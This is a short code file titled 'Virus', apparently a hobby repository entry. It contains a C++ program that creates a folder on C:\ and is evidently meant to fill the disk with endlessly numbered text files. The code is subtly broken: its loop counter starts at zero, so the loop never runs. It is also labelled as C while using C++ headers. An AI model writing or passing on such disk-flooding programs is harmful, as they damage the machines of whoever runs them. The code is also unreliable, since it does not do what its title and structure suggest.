# Virus

```c
#include <bits/stdc++.h>
#include <direct.h>
using namespace std;

int main() {

    long long indexFile = 0;
    char const* path = "C:\\Diphro\\";
    _mkdir(path);

    while (indexFile) {
        indexFile++;
        ofstream file (path + to_string(indexFile) +".txt");
    }
}
```
